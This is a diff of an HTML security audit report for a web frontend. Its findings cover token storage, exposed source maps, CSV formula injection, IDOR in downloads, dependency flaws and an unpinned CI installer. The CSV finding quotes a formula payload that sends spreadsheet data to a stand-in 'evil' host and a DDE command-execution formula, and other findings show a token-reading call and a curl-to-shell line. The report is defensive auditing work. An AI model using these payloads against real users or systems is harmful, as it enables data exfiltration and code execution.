-      <div class="fhead"><span class="fid">SES-001</span><span class="chip st st-handoff">Backend handoff</span><span class="chip high"><span class="dot" style="background:var(--high)"></span>High</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Token Storage · Session Mgmt</span></div>
-      <div class="ftitle">Access &amp; refresh tokens are held in JavaScript-readable <code>sessionStorage</code></div>
+      <div class="fhead">
+        <span class="fid">SES-001</span><span class="chip st st-handoff">Backend handoff</span
+        ><span class="chip high"><span class="dot" style="background: var(--high)"></span>High</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)"
+          >Token Storage · Session Mgmt</span
+        >
+      </div>
+      <div class="ftitle">
+        Access &amp; refresh tokens are held in JavaScript-readable <code>sessionStorage</code>
+      </div>
       <div class="fmeta">
         <span class="tag">Module: <b>Session / Token Mgmt</b></span>
         <span class="tag">File: <span class="path">src/services/authStorage.ts</span></span>
@@ -416,19 +1286,76 @@ useEffect(() =&gt; {
         <span class="tag">Confidence: <b>High</b></span>
         <span class="tag">Priority: <b>High</b></span>
       </div>
-      <div class="frow"><div class="lbl">Description</div><p>On login the access and refresh tokens are written to <span class="path">sessionStorage</span> under <span class="path">recovery_platform_auth_v2</span> as a plain JSON envelope, and re-hydrated into Redux at startup. Both tokens are therefore readable by any JavaScript running on the origin. The Authorization header is set from the in-memory token; refresh is a body-based call to <span class="path">/recovery/auth/refresh</span>.</p></div>
-      <div class="frow"><div class="lbl">Why it is dangerous</div><p>Web-storage tokens are the canonical XSS exfiltration target: a single injected script (RED-001, a vulnerable dependency, or a future sink) reads both tokens and the attacker gains a full, refreshable session off-device. The shared backend already issues an <span class="path">HttpOnly</span> refresh cookie for trade-harmonizer, so a cookie-based path exists that this frontend does not use.</p></div>
-      <div class="frow"><div class="lbl">Attack scenario</div><p>Given any script execution on-origin (compounded by the absence of CSP, HDR-001), <span class="path">sessionStorage.getItem('recovery_platform_auth_v2')</span> yields <span class="path">{accessToken, refreshToken}</span>. The refresh token lets the attacker mint fresh access tokens well beyond the current tab's lifetime.</p></div>
-      <div class="frow"><div class="lbl">Mitigating factors</div><p>Materially better than the localStorage baseline: storage is <b>tab-scoped</b> (<span class="path">sessionStorage</span>), carries a hard <b>12-hour expiry envelope</b> bounded by the JWT <span class="path">exp</span>, and legacy localStorage keys are actively purged. This is why the rating is High rather than Critical.</p></div>
-      <div class="frow"><div class="lbl">Evidence</div>
+      <div class="frow">
+        <div class="lbl">Description</div>
+        <p>
+          On login the access and refresh tokens are written to
+          <span class="path">sessionStorage</span> under
+          <span class="path">recovery_platform_auth_v2</span> as a plain JSON envelope, and
+          re-hydrated into Redux at startup. Both tokens are therefore readable by any JavaScript
+          running on the origin. The Authorization header is set from the in-memory token; refresh
+          is a body-based call to <span class="path">/recovery/auth/refresh</span>.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Why it is dangerous</div>
+        <p>
+          Web-storage tokens are the canonical XSS exfiltration target: a single injected script
+          (RED-001, a vulnerable dependency, or a future sink) reads both tokens and the attacker
+          gains a full, refreshable session off-device. The shared backend already issues an
+          <span class="path">HttpOnly</span> refresh cookie for trade-harmonizer, so a cookie-based
+          path exists that this frontend does not use.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Attack scenario</div>
+        <p>
+          Given any script execution on-origin (compounded by the absence of CSP, HDR-001),
+          <span class="path">sessionStorage.getItem('recovery_platform_auth_v2')</span> yields
+          <span class="path">{accessToken, refreshToken}</span>. The refresh token lets the attacker
+          mint fresh access tokens well beyond the current tab's lifetime.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Mitigating factors</div>
+        <p>
+          Materially better than the localStorage baseline: storage is <b>tab-scoped</b> (<span
+            class="path"
+            >sessionStorage</span
+          >), carries a hard <b>12-hour expiry envelope</b> bounded by the JWT
+          <span class="path">exp</span>, and legacy localStorage keys are actively purged. This is
+          why the rating is High rather than Critical.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Evidence</div>
         <pre class="code">storage.setItem(SESSION_STORAGE_KEY, JSON.stringify(envelope))
 <span class="cm">// envelope = { accessToken, refreshToken, expiresAtMs }  — readable by any on-origin JS</span></pre>
       </div>
       <div class="refs">
-        <div><div class="lbl">OWASP</div><p>A07:2021 Identification &amp; Authentication Failures · Session Management Cheat Sheet · ASVS V3.4 (token storage)</p></div>
-        <div><div class="lbl">ISO 27001/2</div><p>A.8.5 Secure authentication · A.5.17 Authentication information</p></div>
+        <div>
+          <div class="lbl">OWASP</div>
+          <p>
+            A07:2021 Identification &amp; Authentication Failures · Session Management Cheat Sheet ·
+            ASVS V3.4 (token storage)
+          </p>
+        </div>
+        <div>
+          <div class="lbl">ISO 27001/2</div>
+          <p>A.8.5 Secure authentication · A.5.17 Authentication information</p>
+        </div>
       </div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Move the refresh token (at minimum) to an <span class="path">HttpOnly; Secure; SameSite</span> cookie issued by the backend — the pattern already exists server-side — and send <span class="path">credentials:'include'</span> on the refresh call, keeping only a short-lived access token in memory. This collapses the XSS token-theft path. If cookie migration is deferred, closing HDR-001 (CSP) is the essential compensating control.</p></div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Move the refresh token (at minimum) to an
+          <span class="path">HttpOnly; Secure; SameSite</span> cookie issued by the backend — the
+          pattern already exists server-side — and send
+          <span class="path">credentials:'include'</span> on the refresh call, keeping only a
+          short-lived access token in memory. This collapses the XSS token-theft path. If cookie
+          migration is deferred, closing HDR-001 (CSP) is the essential compensating control.
+        </p>
+      </div>
     </div>
   </section>
 
@@ -438,7 +1365,13 @@ useEffect(() =&gt; {
 
     <!-- INFO-001 -->
     <div class="finding med">
-      <div class="fhead"><span class="fid">INFO-001</span><span class="chip st st-fixed">Fixed</span><span class="chip med"><span class="dot" style="background:var(--med)"></span>Medium</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Information Disclosure</span></div>
+      <div class="fhead">
+        <span class="fid">INFO-001</span><span class="chip st st-fixed">Fixed</span
+        ><span class="chip med"><span class="dot" style="background: var(--med)"></span>Medium</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)"
+          >Information Disclosure</span
+        >
+      </div>
       <div class="ftitle">Production build emits and serves JavaScript source maps</div>
       <div class="fmeta">
         <span class="tag">Module: <b>Build / Info Disclosure</b></span>
@@ -446,23 +1379,75 @@ useEffect(() =&gt; {
         <span class="tag">Confidence: <b>High</b></span>
         <span class="tag">Priority: <b>High</b></span>
       </div>
-      <div class="frow"><div class="lbl">Description</div><p><span class="path">GENERATE_SOURCEMAP=false</span> is not set anywhere (no <span class="path">.env</span> flag, no cross-env in the build script). CRA therefore emits <span class="path">*.map</span> files — confirmed present in <span class="path">build/static/js/*.chunk.js.map</span> — and Amplify serves the entire <span class="path">build/</span> directory, so the maps are publicly fetchable.</p></div>
-      <div class="frow"><div class="lbl">Why it is dangerous</div><p>Source maps reconstruct the full, un-minified, commented TypeScript source in the browser. An attacker preparing a pentest gains the complete client logic — route guards, the token-storage envelope shape, endpoint list, tenant-validation flow — turning black-box testing into white-box and surfacing every other finding here for free.</p></div>
-      <div class="frow"><div class="lbl">Attack scenario</div><p><span class="path">curl https://&lt;tenant&gt;.recovery.tradeharmonizer.co.uk/static/js/main.&lt;hash&gt;.js.map</span> returns readable source, revealing internal comments (e.g. "Same contract as trade-harmonizer …") and the exact storage key names used in SES-001.</p></div>
-      <div class="frow"><div class="lbl">Evidence</div><pre class="code"><span class="cm"># find build -name "*.map"  →  4 files</span>
-build/static/js/main.7c2da6d6.js.map
-build/static/js/977.a723d293.chunk.js.map</pre></div>
-      <div class="refs">
-        <div><div class="lbl">OWASP</div><p>A05:2021 Security Misconfiguration · WSTG-CONF-02</p></div>
-        <div><div class="lbl">ISO 27001/2</div><p>A.8.9 Configuration Management · A.8.11 Data masking</p></div>
+      <div class="frow">
+        <div class="lbl">Description</div>
+        <p>
+          <span class="path">GENERATE_SOURCEMAP=false</span> is not set anywhere (no
+          <span class="path">.env</span> flag, no cross-env in the build script). CRA therefore
+          emits <span class="path">*.map</span> files — confirmed present in
+          <span class="path">build/static/js/*.chunk.js.map</span> — and Amplify serves the entire
+          <span class="path">build/</span> directory, so the maps are publicly fetchable.
+        </p>
       </div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Set <span class="path">GENERATE_SOURCEMAP=false</span> for the production build (build script or Amplify env var). If maps are wanted for error monitoring, upload them to the monitoring service as a private build step and exclude <span class="path">*.map</span> from deployed artifacts.</p></div>
+      <div class="frow">
+        <div class="lbl">Why it is dangerous</div>
+        <p>
+          Source maps reconstruct the full, un-minified, commented TypeScript source in the browser.
+          An attacker preparing a pentest gains the complete client logic — route guards, the
+          token-storage envelope shape, endpoint list, tenant-validation flow — turning black-box
+          testing into white-box and surfacing every other finding here for free.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Attack scenario</div>
+        <p>
+          <span class="path"
+            >curl
+            https://&lt;tenant&gt;.recovery.tradeharmonizer.co.uk/static/js/main.&lt;hash&gt;.js.map</span
+          >
+          returns readable source, revealing internal comments (e.g. "Same contract as
+          trade-harmonizer …") and the exact storage key names used in SES-001.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Evidence</div>
+        <pre class="code"><span class="cm"># find build -name "*.map"  →  4 files</span>
+build/static/js/main.7c2da6d6.js.map
+build/static/js/977.a723d293.chunk.js.map</pre>
+      </div>
+      <div class="refs">
+        <div>
+          <div class="lbl">OWASP</div>
+          <p>A05:2021 Security Misconfiguration · WSTG-CONF-02</p>
+        </div>
+        <div>
+          <div class="lbl">ISO 27001/2</div>
+          <p>A.8.9 Configuration Management · A.8.11 Data masking</p>
+        </div>
+      </div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Set <span class="path">GENERATE_SOURCEMAP=false</span> for the production build (build
+          script or Amplify env var). If maps are wanted for error monitoring, upload them to the
+          monitoring service as a private build step and exclude
+          <span class="path">*.map</span> from deployed artifacts.
+        </p>
+      </div>
     </div>
 
     <!-- CSV-001 -->
     <div class="finding med">
-      <div class="fhead"><span class="fid">CSV-001</span><span class="chip st st-fixed">Fixed</span><span class="chip med"><span class="dot" style="background:var(--med)"></span>Medium</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Output Encoding · CSV Injection</span></div>
-      <div class="ftitle">CSV export quotes cells but does not neutralize spreadsheet formula injection</div>
+      <div class="fhead">
+        <span class="fid">CSV-001</span><span class="chip st st-fixed">Fixed</span
+        ><span class="chip med"><span class="dot" style="background: var(--med)"></span>Medium</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)"
+          >Output Encoding · CSV Injection</span
+        >
+      </div>
+      <div class="ftitle">
+        CSV export quotes cells but does not neutralize spreadsheet formula injection
+      </div>
       <div class="fmeta">
         <span class="tag">Module: <b>Shipments / Export</b></span>
         <span class="tag">File: <span class="path">src/lib/csv.ts</span></span>
@@ -470,91 +1455,317 @@ build/static/js/977.a723d293.chunk.js.map</pre></div>
         <span class="tag">Confidence: <b>Medium</b></span>
         <span class="tag">Priority: <b>Normal</b></span>
       </div>
-      <div class="frow"><div class="lbl">Description</div><p><span class="path">escapeCell</span> applies RFC-4180 quoting (wrapping values containing <span class="path">" , \n</span>) but does not guard against cells that <i>begin</i> with <span class="path">=</span>, <span class="path">+</span>, <span class="path">-</span>, <span class="path">@</span>, tab, or CR — the triggers for spreadsheet formula execution. The trade-harmonizer baseline had a dedicated <span class="path">sanitizeCsvExportData</span> helper; RECOVERY's export lacks the equivalent.</p></div>
-      <div class="frow"><div class="lbl">Why it is dangerous</div><p>Shipment titles, PO numbers and related fields originate from ingested customer emails/documents — attacker-influenceable data. When an operator opens the exported CSV in Excel/Sheets, a value like <span class="path">=IMPORTXML(...)</span> or <span class="path">=cmd|'/c calc'!A1</span> executes in their trusted desktop context (data exfiltration or, with legacy DDE, code execution).</p></div>
-      <div class="frow"><div class="lbl">Attack scenario</div><p>An adversary emails a document whose parsed shipment title is <span class="path">=HYPERLINK("http://evil/?d="&amp;A2,"open")</span>. It flows through the pipeline into the shipments list; an analyst exports and opens the CSV, and the formula fires against every adjacent cell.</p></div>
-      <div class="frow"><div class="lbl">Evidence</div><pre class="code">function escapeCell(value: string): string {
+      <div class="frow">
+        <div class="lbl">Description</div>
+        <p>
+          <span class="path">escapeCell</span> applies RFC-4180 quoting (wrapping values containing
+          <span class="path">" , \n</span>) but does not guard against cells that <i>begin</i> with
+          <span class="path">=</span>, <span class="path">+</span>, <span class="path">-</span>,
+          <span class="path">@</span>, tab, or CR — the triggers for spreadsheet formula execution.
+          The trade-harmonizer baseline had a dedicated
+          <span class="path">sanitizeCsvExportData</span> helper; RECOVERY's export lacks the
+          equivalent.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Why it is dangerous</div>
+        <p>
+          Shipment titles, PO numbers and related fields originate from ingested customer
+          emails/documents — attacker-influenceable data. When an operator opens the exported CSV in
+          Excel/Sheets, a value like <span class="path">=IMPORTXML(...)</span> or
+          <span class="path">=cmd|'/c calc'!A1</span> executes in their trusted desktop context
+          (data exfiltration or, with legacy DDE, code execution).
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Attack scenario</div>
+        <p>
+          An adversary emails a document whose parsed shipment title is
+          <span class="path">=HYPERLINK("http://evil/?d="&amp;A2,"open")</span>. It flows through
+          the pipeline into the shipments list; an analyst exports and opens the CSV, and the
+          formula fires against every adjacent cell.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Evidence</div>
+        <pre class="code">function escapeCell(value: string): string {
   if (/[",\n\r]/.test(value)) return `"${value.replace(/"/g, '""')}"`
   return value   <span class="bad">// leading =,+,-,@ pass through unmodified</span>
-}</pre></div>
-      <div class="refs">
-        <div><div class="lbl">OWASP</div><p>A03:2021 Injection · OWASP CSV Injection · WSTG-CLNT-13</p></div>
-        <div><div class="lbl">ISO 27001/2</div><p>A.8.28 Secure coding · A.8.26 Application security requirements</p></div>
+}</pre>
       </div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Before quoting, prefix any cell whose first character is <span class="path">= + - @ \t \r</span> with a single quote (or a leading tab/space) to force text interpretation. Apply consistently to <span class="path">buildShipmentsCsv</span> and any <span class="path">react-csv</span> <span class="path">CSVLink</span> data.</p></div>
+      <div class="refs">
+        <div>
+          <div class="lbl">OWASP</div>
+          <p>A03:2021 Injection · OWASP CSV Injection · WSTG-CLNT-13</p>
+        </div>
+        <div>
+          <div class="lbl">ISO 27001/2</div>
+          <p>A.8.28 Secure coding · A.8.26 Application security requirements</p>
+        </div>
+      </div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Before quoting, prefix any cell whose first character is
+          <span class="path">= + - @ \t \r</span> with a single quote (or a leading tab/space) to
+          force text interpretation. Apply consistently to
+          <span class="path">buildShipmentsCsv</span> and any <span class="path">react-csv</span>
+          <span class="path">CSVLink</span> data.
+        </p>
+      </div>
     </div>
 
     <!-- IDOR-001 -->
     <div class="finding med">
-      <div class="fhead"><span class="fid">API-001</span><span class="chip st st-mitig">Already mitigated</span><span class="chip med"><span class="dot" style="background:var(--med)"></span>Medium</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Broken Access Control · IDOR</span></div>
-      <div class="ftitle">Download endpoint is driven by client-supplied <code>s3Key</code> and <code>bucket</code></div>
+      <div class="fhead">
+        <span class="fid">API-001</span><span class="chip st st-mitig">Already mitigated</span
+        ><span class="chip med"><span class="dot" style="background: var(--med)"></span>Medium</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)"
+          >Broken Access Control · IDOR</span
+        >
+      </div>
+      <div class="ftitle">
+        Download endpoint is driven by client-supplied <code>s3Key</code> and <code>bucket</code>
+      </div>
       <div class="fmeta">
         <span class="tag">Module: <b>Inbox / Downloads</b></span>
-        <span class="tag">File: <span class="path">recoveryApi.ts</span> · <span class="path">inbox-detail-panel.tsx</span></span>
+        <span class="tag"
+          >File: <span class="path">recoveryApi.ts</span> ·
+          <span class="path">inbox-detail-panel.tsx</span></span
+        >
         <span class="tag">Fn: <b>getRecoveryDownloadUrl</b></span>
         <span class="tag">Confidence: <b>Medium</b> (backend-dependent)</span>
         <span class="tag">Priority: <b>Normal</b></span>
       </div>
-      <div class="frow"><div class="lbl">Description</div><p>The attachment download mutation forwards <span class="path">s3Key</span>, <span class="path">bucket</span>, <span class="path">recordType</span> and <span class="path">fileName</span> as query params to <span class="path">/recovery/documents/combined/:id/download</span>, and the returned presigned URL is opened via <span class="path">window.location.href</span>. These object identifiers are supplied by the client, not derived server-side from the authenticated user's ownership of <span class="path">:id</span>.</p></div>
-      <div class="frow"><div class="lbl">Why it is dangerous</div><p>If the backend signs whatever <span class="path">s3Key</span>/<span class="path">bucket</span> it is handed without verifying that the object belongs to the caller's tenant/document, an authenticated user can read arbitrary S3 objects (other tenants' documents) — an IDOR. This is fundamentally a server-side authorization control, but the frontend contract makes the keys attacker-controllable and should be validated during the pentest.</p></div>
-      <div class="frow"><div class="lbl">Attack scenario</div><p>A logged-in tenant user replays the download call substituting another tenant's known/guessed <span class="path">s3Key</span> and <span class="path">bucket</span>; if the API signs it, the response is a working presigned URL to a foreign document.</p></div>
-      <div class="frow"><div class="lbl">Evidence</div><pre class="code">query: ({ id, s3Key, bucket, recordType, fileName, expiresIn = 300 }) =&gt; ({
+      <div class="frow">
+        <div class="lbl">Description</div>
+        <p>
+          The attachment download mutation forwards <span class="path">s3Key</span>,
+          <span class="path">bucket</span>, <span class="path">recordType</span> and
+          <span class="path">fileName</span> as query params to
+          <span class="path">/recovery/documents/combined/:id/download</span>, and the returned
+          presigned URL is opened via <span class="path">window.location.href</span>. These object
+          identifiers are supplied by the client, not derived server-side from the authenticated
+          user's ownership of <span class="path">:id</span>.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Why it is dangerous</div>
+        <p>
+          If the backend signs whatever <span class="path">s3Key</span>/<span class="path"
+            >bucket</span
+          >
+          it is handed without verifying that the object belongs to the caller's tenant/document, an
+          authenticated user can read arbitrary S3 objects (other tenants' documents) — an IDOR.
+          This is fundamentally a server-side authorization control, but the frontend contract makes
+          the keys attacker-controllable and should be validated during the pentest.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Attack scenario</div>
+        <p>
+          A logged-in tenant user replays the download call substituting another tenant's
+          known/guessed <span class="path">s3Key</span> and <span class="path">bucket</span>; if the
+          API signs it, the response is a working presigned URL to a foreign document.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Evidence</div>
+        <pre
+          class="code"
+        >query: ({ id, s3Key, bucket, recordType, fileName, expiresIn = 300 }) =&gt; ({
   url: `/recovery/documents/combined/${id}/download`,
   params: { s3Key, bucket, recordType, fileName, expiresIn },  <span class="bad">// client-controlled keys</span>
-})</pre></div>
-      <div class="refs">
-        <div><div class="lbl">OWASP</div><p>A01:2021 Broken Access Control (IDOR) · API1:2023 BOLA · ASVS V4.2</p></div>
-        <div><div class="lbl">ISO 27001/2</div><p>A.8.3 Information access restriction · A.5.15 Access control</p></div>
+})</pre>
       </div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Frontend: stop passing raw storage identifiers — send only the document/attachment id and let the server resolve the key. Confirm (read-only) that the backend derives <span class="path">s3Key</span>/<span class="path">bucket</span> from the record and enforces tenant ownership before presigning. Flag as an explicit test case for the pentest.</p></div>
+      <div class="refs">
+        <div>
+          <div class="lbl">OWASP</div>
+          <p>A01:2021 Broken Access Control (IDOR) · API1:2023 BOLA · ASVS V4.2</p>
+        </div>
+        <div>
+          <div class="lbl">ISO 27001/2</div>
+          <p>A.8.3 Information access restriction · A.5.15 Access control</p>
+        </div>
+      </div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Frontend: stop passing raw storage identifiers — send only the document/attachment id and
+          let the server resolve the key. Confirm (read-only) that the backend derives
+          <span class="path">s3Key</span>/<span class="path">bucket</span> from the record and
+          enforces tenant ownership before presigning. Flag as an explicit test case for the
+          pentest.
+        </p>
+      </div>
     </div>
 
     <!-- DEP-001 -->
     <div class="finding med">
-      <div class="fhead"><span class="fid">DEP-001</span><span class="chip st st-fixed">Fixed</span><span class="chip med"><span class="dot" style="background:var(--med)"></span>Medium</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Dependency Vulnerabilities</span></div>
-      <div class="ftitle">27 known-vulnerable dependencies (1 Critical, 11 High) in the toolchain</div>
+      <div class="fhead">
+        <span class="fid">DEP-001</span><span class="chip st st-fixed">Fixed</span
+        ><span class="chip med"><span class="dot" style="background: var(--med)"></span>Medium</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)"
+          >Dependency Vulnerabilities</span
+        >
+      </div>
+      <div class="ftitle">
+        27 known-vulnerable dependencies (1 Critical, 11 High) in the toolchain
+      </div>
       <div class="fmeta">
         <span class="tag">Module: <b>Dependencies</b></span>
         <span class="tag">File: <span class="path">package-lock.json</span></span>
         <span class="tag">Confidence: <b>High</b></span>
         <span class="tag">Priority: <b>Normal</b></span>
       </div>
-      <div class="frow"><div class="lbl">Description</div><p><span class="path">npm audit</span> reports 27 advisories (2 low, 13 moderate, 11 high, 1 critical). The critical (<span class="path">websocket-driver</span>) and highs (<span class="path">ws</span>, <span class="path">nth-check</span>, <span class="path">postcss</span>, etc.) chain almost entirely from <span class="path">react-scripts</span> → <span class="path">webpack-dev-server</span> and <span class="path">jsdom</span> — build- and test-time tooling, not code shipped to the browser.</p></div>
-      <div class="frow"><div class="lbl">Why it is dangerous</div><p>Runtime exposure to end users is low (the vulnerable packages are dev/build dependencies), but they inflate the audited attack surface, block the intended <span class="path">--audit-level=high</span> CI gate, and <span class="path">react-scripts 5.0.1</span> is effectively unmaintained — future CVEs will not be patched upstream. The dev server itself (<span class="path">ws</span>/<span class="path">websocket-driver</span>) is a real risk on developer machines.</p></div>
-      <div class="frow"><div class="lbl">Attack scenario</div><p>A developer running <span class="path">npm start</span> on an untrusted network is exposed to the <span class="path">ws</span> memory-disclosure/DoS advisories; CI's <span class="path">security:audit</span> script fails at <span class="path">--audit-level=high</span> if it were actually run (see SUP-001).</p></div>
-      <div class="frow"><div class="lbl">Evidence</div><pre class="code">27 vulnerabilities (2 low, 13 moderate, 11 high, 1 critical)
-websocket-driver &lt;=0.7.4   Severity: critical
-ws 7.0.0-7.5.10 || 8.0.0-8.20.1   Severity: high</pre></div>
-      <div class="refs">
-        <div><div class="lbl">OWASP</div><p>A06:2021 Vulnerable &amp; Outdated Components · ASVS V14.2</p></div>
-        <div><div class="lbl">ISO 27001/2</div><p>A.8.8 Management of technical vulnerabilities</p></div>
+      <div class="frow">
+        <div class="lbl">Description</div>
+        <p>
+          <span class="path">npm audit</span> reports 27 advisories (2 low, 13 moderate, 11 high, 1
+          critical). The critical (<span class="path">websocket-driver</span>) and highs (<span
+            class="path"
+            >ws</span
+          >, <span class="path">nth-check</span>, <span class="path">postcss</span>, etc.) chain
+          almost entirely from <span class="path">react-scripts</span> →
+          <span class="path">webpack-dev-server</span> and <span class="path">jsdom</span> — build-
+          and test-time tooling, not code shipped to the browser.
+        </p>
       </div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Run <span class="path">npm audit fix</span> for non-breaking upgrades; document the residual dev-only advisories as accepted risk. Plan migration off <span class="path">react-scripts</span> to a maintained bundler (Vite) to durably remove the <span class="path">webpack-dev-server</span> chain. Do not use <span class="path">--force</span> blindly (it downgrades packages and can break the build).</p></div>
+      <div class="frow">
+        <div class="lbl">Why it is dangerous</div>
+        <p>
+          Runtime exposure to end users is low (the vulnerable packages are dev/build dependencies),
+          but they inflate the audited attack surface, block the intended
+          <span class="path">--audit-level=high</span> CI gate, and
+          <span class="path">react-scripts 5.0.1</span> is effectively unmaintained — future CVEs
+          will not be patched upstream. The dev server itself (<span class="path">ws</span>/<span
+            class="path"
+            >websocket-driver</span
+          >) is a real risk on developer machines.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Attack scenario</div>
+        <p>
+          A developer running <span class="path">npm start</span> on an untrusted network is exposed
+          to the <span class="path">ws</span> memory-disclosure/DoS advisories; CI's
+          <span class="path">security:audit</span> script fails at
+          <span class="path">--audit-level=high</span> if it were actually run (see SUP-001).
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Evidence</div>
+        <pre class="code">
+27 vulnerabilities (2 low, 13 moderate, 11 high, 1 critical)
+websocket-driver &lt;=0.7.4   Severity: critical
+ws 7.0.0-7.5.10 || 8.0.0-8.20.1   Severity: high</pre
+        >
+      </div>
+      <div class="refs">
+        <div>
+          <div class="lbl">OWASP</div>
+          <p>A06:2021 Vulnerable &amp; Outdated Components · ASVS V14.2</p>
+        </div>
+        <div>
+          <div class="lbl">ISO 27001/2</div>
+          <p>A.8.8 Management of technical vulnerabilities</p>
+        </div>
+      </div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Run <span class="path">npm audit fix</span> for non-breaking upgrades; document the
+          residual dev-only advisories as accepted risk. Plan migration off
+          <span class="path">react-scripts</span> to a maintained bundler (Vite) to durably remove
+          the <span class="path">webpack-dev-server</span> chain. Do not use
+          <span class="path">--force</span> blindly (it downgrades packages and can break the
+          build).
+        </p>
+      </div>
     </div>
 
     <!-- SUP-001 -->
     <div class="finding med">
-      <div class="fhead"><span class="fid">SUP-001</span><span class="chip st st-fixed">Fixed*</span><span class="chip med"><span class="dot" style="background:var(--med)"></span>Medium</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Supply Chain · CI Configuration</span></div>
-      <div class="ftitle">Security scans are defined but not enforced; Trivy installer is unpinned</div>
+      <div class="fhead">
+        <span class="fid">SUP-001</span><span class="chip st st-fixed">Fixed*</span
+        ><span class="chip med"><span class="dot" style="background: var(--med)"></span>Medium</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)"
+          >Supply Chain · CI Configuration</span
+        >
+      </div>
+      <div class="ftitle">
+        Security scans are defined but not enforced; Trivy installer is unpinned
+      </div>
       <div class="fmeta">
         <span class="tag">Module: <b>Supply Chain / CI</b></span>
-        <span class="tag">File: <span class="path">amplify.yml</span>, <span class="path">package.json</span>, <span class="path">.npmrc</span></span>
+        <span class="tag"
+          >File: <span class="path">amplify.yml</span>, <span class="path">package.json</span>,
+          <span class="path">.npmrc</span></span
+        >
         <span class="tag">Confidence: <b>High</b></span>
         <span class="tag">Priority: <b>Normal</b></span>
       </div>
-      <div class="frow"><div class="lbl">Description</div><p>The Amplify build installs Trivy by piping a script fetched from the <b>unpinned <span class="path">main</span> branch</b> (<span class="path">curl -sfL .../trivy/main/contrib/install.sh | sh</span>), prints its version, then <b>never runs a scan</b> — the build phase only calls <span class="path">npm run build</span>. Neither <span class="path">trivy:scan</span> nor <span class="path">security:audit</span> gates the pipeline. <span class="path">.npmrc</span> also sets <span class="path">legacy-peer-deps=true</span>, masking dependency-resolution conflicts.</p></div>
-      <div class="frow"><div class="lbl">Why it is dangerous</div><p>Piping an unpinned remote script to a shell in CI is a supply-chain foothold: whoever controls that path can execute arbitrary code in the build with repo/deploy credentials. And because the scans it installs are never executed, the project has the <i>appearance</i> of vulnerability gating (DEP-001 would otherwise be caught) without the substance.</p></div>
-      <div class="frow"><div class="lbl">Attack scenario</div><p>Compromise of (or a malicious commit to) the fetched installer path runs attacker code inside the Amplify build container, which holds source and deploy permissions — a classic build-system compromise.</p></div>
-      <div class="frow"><div class="lbl">Evidence</div><pre class="code"><span class="cm"># amplify.yml preBuild</span>
+      <div class="frow">
+        <div class="lbl">Description</div>
+        <p>
+          The Amplify build installs Trivy by piping a script fetched from the
+          <b>unpinned <span class="path">main</span> branch</b> (<span class="path"
+            >curl -sfL .../trivy/main/contrib/install.sh | sh</span
+          >), prints its version, then <b>never runs a scan</b> — the build phase only calls
+          <span class="path">npm run build</span>. Neither <span class="path">trivy:scan</span> nor
+          <span class="path">security:audit</span> gates the pipeline.
+          <span class="path">.npmrc</span> also sets
+          <span class="path">legacy-peer-deps=true</span>, masking dependency-resolution conflicts.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Why it is dangerous</div>
+        <p>
+          Piping an unpinned remote script to a shell in CI is a supply-chain foothold: whoever
+          controls that path can execute arbitrary code in the build with repo/deploy credentials.
+          And because the scans it installs are never executed, the project has the
+          <i>appearance</i> of vulnerability gating (DEP-001 would otherwise be caught) without the
+          substance.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Attack scenario</div>
+        <p>
+          Compromise of (or a malicious commit to) the fetched installer path runs attacker code
+          inside the Amplify build container, which holds source and deploy permissions — a classic
+          build-system compromise.
+        </p>
+      </div>
+      <div class="frow">
+        <div class="lbl">Evidence</div>
+        <pre class="code"><span class="cm"># amplify.yml preBuild</span>
 - curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/<span class="bad">main</span>/contrib/install.sh | sh -s -- -b ./bin
 - trivy --version            <span class="cm"># installed &amp; version-checked…</span>
 <span class="cm"># build phase</span>
-- npm run build              <span class="cm"># …but no `trivy fs` and no `npm audit` gate</span></pre></div>
-      <div class="refs">
-        <div><div class="lbl">OWASP</div><p>A08:2021 Software &amp; Data Integrity Failures · CI/CD Security</p></div>
-        <div><div class="lbl">ISO 27001/2</div><p>A.8.30 Outsourced development · A.8.8 Technical vulnerabilities · A.8.9 Configuration</p></div>
+- npm run build              <span class="cm"># …but no `trivy fs` and no `npm audit` gate</span></pre>
       </div>
